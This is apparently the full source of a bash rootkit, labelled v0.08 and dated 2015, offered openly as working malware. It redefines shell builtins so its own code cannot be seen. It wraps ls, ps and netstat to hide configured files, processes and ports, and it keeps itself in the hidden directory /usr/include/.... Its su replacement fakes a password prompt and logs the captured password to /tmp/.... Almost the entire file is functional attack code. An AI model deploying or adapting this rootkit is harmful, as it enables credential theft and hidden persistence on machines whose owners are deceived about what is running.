#!/bin/bash
# Lightweight rootkit implemented by bash shell scripts v0.08
#
# by wzt 2015 	http://www.cloud-sec.org
#

#declare -r builtin
#declare -r declare
#declare -r set
#declare -r fake_unset
#declare -r type
#declare -r typeset

#unalias ls >/dev/null 2>&1

set +v

BR_ROOTKIT_PATH="/usr/include/..."

function abcdmagic()
{
	:
}

function br_hide_engine()
{
        declare -a brootkit_func=(
                                "^typeset.*()|15" "^type.*()|27"
                                "^su.*()|26" "^reset_ps.*()|8"
                                "^reset_netstat.*()|8" "^reset_ls.*()|8"
                                "^reset_command.*()|42" "^ps.*()|14"
                                "^netstat.*()|14" "^max_file_length.*()|9"
                                "^ls.*()|64" "^fake_unset.*()|10"
                                "^fake_command.*()|12" "^display_array.*()|11"
                                "^dir.*()|3" "^declare.*()|41"
                                "^command*()|39" "^builtin.*()|19"
                                "^br_load_config.*()|28" "^br_display_config.*()|14"
                                "^abcdmagic.*()|3" "^/usr/bin/dir.*()|5"
                                "^/bin/ps.*()|5" "^/bin/netstat.*()|5"
                                "^/bin/ls.*()|5" "^br_hide_file=|5"
				"^set.*()|19" "^br_hide_engine.*()|30"
                                )
        local func_line br_func func_name func_num

	echo "$1" >.br.tmp
        for br_func in ${brootkit_func[*]}
        do
                func_name=`echo $br_func | cut -d "|" -f 1`
                func_num=`echo $br_func | cut -d "|" -f 2`
                #echo $func_name $func_num
                func_line=`grep -n "$func_name" .br.tmp| awk -F: {'print $1'}`
                #echo $func_line
                sed -i "$func_line,+$func_num d" .br.tmp >/dev/null 2>&1
        done
	cat .br.tmp; rm -f .br.tmp
}

function builtin()
{
	local fake_a

	unset command
	case $1 in 
		"declare"|"set"|"unset"|"command"|"type"|"typeset")
        		fake_a="$(command builtin $1 $2)"
			br_hide_engine "$fake_a"
			reset_command
			return ;;
		"builtin")
			echo "bash: builtin: builtin: syntax error, bash($BASH_VERSION) is not support."
			reset_command
			return ;;
		*)
			command builtin $1 $2
			reset_command
			;;
	esac
}

function declare()
{
	local fake_a

	unset command
	case $1 in 
		"")
        		fake_a="$(command declare $1 $2)"
			br_hide_engine "$fake_a"
			reset_command
			return ;;
		"-f"|"-F")
        		fake_a="$(command declare $1 $2)"
        		fake_b=${fake_a/\/bin\/ls?()*/}
			echo -n "$fake_b"
			reset_command
			return ;;
		*)
        		command declare $1 $2
			reset_command
			return ;;
	esac
}

function typeset()
{
        local fake_a 

	unset command
        case $1 in
                ""|"-f"|"-F")
                        fake_a="$(command declare $1 $2)"
			br_hide_engine "$fake_a"
			reset_command
                        return ;;
                *)
                        command typeset $1 $2
			reset_command
                        return ;;
        esac
}

function type()
{
        case $1 in
                "builtin"|"declare"|"set"|"unset"|"type"|"typeset")
                        echo "$1 is a shell builtin"
                        return ;;
		"dir")
			echo "dir is /usr/bin/dir"
			return ;;
		"ls")
			echo "ls is aliased to ls --color=tty"
			return ;;
		"ps")
			echo "ps is /bin/ps"
			return ;;
		"netstat")
			echo "netstat is hashed (/bin/netstat)"
			return ;;
		"/bin/ls"|"/usr/bin/dir"|"/bin/ps"|"/bin/netstat")
			echo "$1 is $1"
			return ;;
                *)
			unset command
                        command type $1 $2
			reset_command
                        return ;;
        esac
}

function set()
{
        local fake_a

	unset command
        case $1 in
                "")
                        fake_a="$(command set)"
			br_hide_engine "$fake_a"
			reset_command
                        return ;;
		"-x"|"+x")
			reset_command
			return ;;
                *)
			echo $1 $2
                        command set $1 $2
			reset_command
                        return ;;
        esac
}

function fake_unset()
{
        case $1 in
                "builtin"|"declare"|"command"|"set"|"unset"|"type"|"typeset")
                        echo "bash: syntax error, bash($BASH_VERSION) is not support."
                        return ;;
                *)
                        unset $1 $2
                        return ;;
        esac
}

function fake_command()
{
        case $1 in
                "builtin"|"declare"|"command"|"set"|"unset"|"type"|"typeset")
                        echo "bash: syntax error, bash($BASH_VERSION) is not support."
                        return ;;
                *)
			unset command
                        command $1 $2
                        reset_command
                        return ;;
        esac
}

function command()
{
        case $1 in
                "builtin")
			builtin $2 $3
			return ;;
                "declare")
			declare $2 $3
			return ;;
		"set")
			set $2 $3
			return ;;
		"unset")
			fake_unset $2 $3
			. $BR_ROOTKIT_PATH/brootkit.sh
			return ;;
		"type")
			type $2 $3
			return ;;
		"typeset")
			typeset $2 $3
			return ;;
		"command")
			fake_command $2 $3
			return ;;
                *)
			unset command
			command $2 $3
			. $BR_ROOTKIT_PATH/brootkit.sh
			return ;;
        esac
}

function reset_command()
{
	function command()
	{
        	case $1 in
                	"builtin")
                        	builtin $2 $3
                        	return ;;
                	"declare")
                        	declare $2 $3
                        	return ;;
                	"set")
                        	set $2 $3
                        	return ;;
                	"unset")
                        	fake_unset $2 $3
                        	. $BR_ROOTKIT_PATH/brootkit.sh
                        	return ;;
                	"type")
                        	type $2 $3
                        	return ;;
                	"typeset")
                        	typeset $2 $3
                        	return ;;
                	"command")
                        	fake_command $2 $3
                        	return ;;
                	*)
                        	unset command
                        	command $2 $3
                        	. $BR_ROOTKIT_PATH/brootkit.sh
                        	return ;;
        	esac
	}
}

function su()
{
        local arg_list=("" "-" "-l" "--login"
                        "-c" "--command" "--session-command"
                        "-f" "--fast"
                        "-m" "--preserve-environment" "-p"
                        "-s" "--shell=SHELL")
        local flag=0 tmp_arg arg pass

        if [ $UID -eq 0 ]; then
                /bin/su $1; unset su ; return $?
        fi

        for arg in ${arg_list[@]}
        do
                [ "$1" = "$arg" ] && flag=1
        done

        [ $# -eq 0 ] && flag=1

        tmp_arg=$1;tmp_arg=${tmp_arg:0:1};
        [ "$tmp_arg" != "-" -a $flag -eq 0 ] && flag=1

        if [ $flag -ne 1 ];then
                /bin/su $1; return $?
        fi

        [ ! -f /tmp/... ] && `touch /tmp/... && chmod 777 /tmp/... >/dev/null 2>&1`

        echo -ne "Password:\r\033[?25l"
        read -t 30 -s pass
        echo -ne "\033[K\033[?25h"

        /bin/su && unset su && echo $pass >> /tmp/...
}

unalias ls >/dev/null 2>&1

function max_file_length()
{
	local tmp_file sum=0 n=0

	for tmp_file in `/bin/ls $@`
	do
		n=${#tmp_file}
		[ $n -gt $sum ] && sum=$n
	done
	
	return $sum
}

function ls()
{
	local fake_file max_col_num file_format
	local hide_file hide_flag file_arg old_ifs
	local file_len=0 sum=0 n=0 display_mode=0

	max_col_num=`stty size|cut -d " " -f 2`

        . $BR_ROOTKIT_PATH/brconfig.sh
        br_load_config $BR_ROOTKIT_PATH/br.conf

	for file_arg in $@
	do
        	if echo $file_arg|grep -q -e "^-.*l.*"; then
			display_mode=1; break
        	fi
	done

	case $display_mode in
	0)
		unset -f /bin/ls
		max_file_length $@
		file_len=$?

		for fake_file in $(/bin/ls $@)
        	do
			hide_flag=0
        		old_ifs=$IFS; IFS=","
        		for hide_file in ${br_hide_file[@]}
        		do
                		if echo "$fake_file"|grep -e "^$hide_file" >/dev/null;then
					hide_flag=1; break
				fi
			done
       			IFS=$old_ifs

			[ $hide_flag -eq  1 ] && continue

			n=${#fake_file}
			((sum=sum+n+file_len))

			if [ $sum -gt $max_col_num ];then
				file_format="%-$file_len""s\n"
				printf $file_format $fake_file
				sum=0
			else
				file_format="%-$file_len""s "
				printf $file_format $fake_file
			fi
        	done

		[ $sum -le $max_col_num ] && echo ""
		reset_ls
		return ;;
	1)	
		unset -f /bin/ls

		fake_file=`/bin/ls $@`
        	old_ifs=$IFS; IFS=","
        	for hide_file in ${br_hide_file[@]}
        	do
			fake_file=`echo "$fake_file" | sed -e '/'$hide_file'/d'`
        	done
        	IFS=$old_ifs
		echo "$fake_file"
		reset_ls

		return ;;
	esac
}

function dir()
{
	/bin/ls $@
}

function /usr/bin/dir()
{
	unset -f /bin/ls
	/bin/ls $@
	reset_ls
}

function reset_ls()
{
	function /bin/ls()
	{
		unset -f /bin/ls
		/bin/ls $@
		reset_ls
	}
}

function /bin/ls()
{
	unset -f /bin/ls
	/bin/ls $@
	reset_ls
}

function ps()
{
        local proc_name hide_proc old_ifs

        . $BR_ROOTKIT_PATH/brconfig.sh
        br_load_config $BR_ROOTKIT_PATH/br.conf

        old_ifs=$IFS; IFS=","

        proc_name=`/bin/ps $@`
        for hide_proc in ${br_hide_proc[@]}
        do
        	proc_name=`echo "$proc_name" | sed -e '/'$hide_proc'/d'`
        done

        echo "$proc_name"
	IFS=$old_ifs
}

function reset_ps()
{
        function /bin/ps()
        {
                unset -f /bin/ps
                ps $@
                reset_ps
        }
}

function /bin/ps()
{
        unset -f /bin/ps
        ps $@
        reset_ps
}

function netstat()
{
        local hide_port tmp_port old_ifs

	. $BR_ROOTKIT_PATH/brconfig.sh
	br_load_config $BR_ROOTKIT_PATH/br.conf

	old_ifs=$IFS; IFS=","
        tmp_port=`/bin/netstat $@`
        for hide_port in ${br_hide_port[@]}
        do
                tmp_port=`echo "$tmp_port" | sed -e '/'$hide_port'/d'`
        done
        echo "$tmp_port"
	IFS=$old_ifs
}

function reset_netstat()
{
        function /bin/netstat()
        {
                unset -f /bin/netstat
                netstat $@
                reset_netstat
        }
}

function /bin/netstat()
{
        unset -f /bin/netstat
        netstat $@
        reset_netstat
}
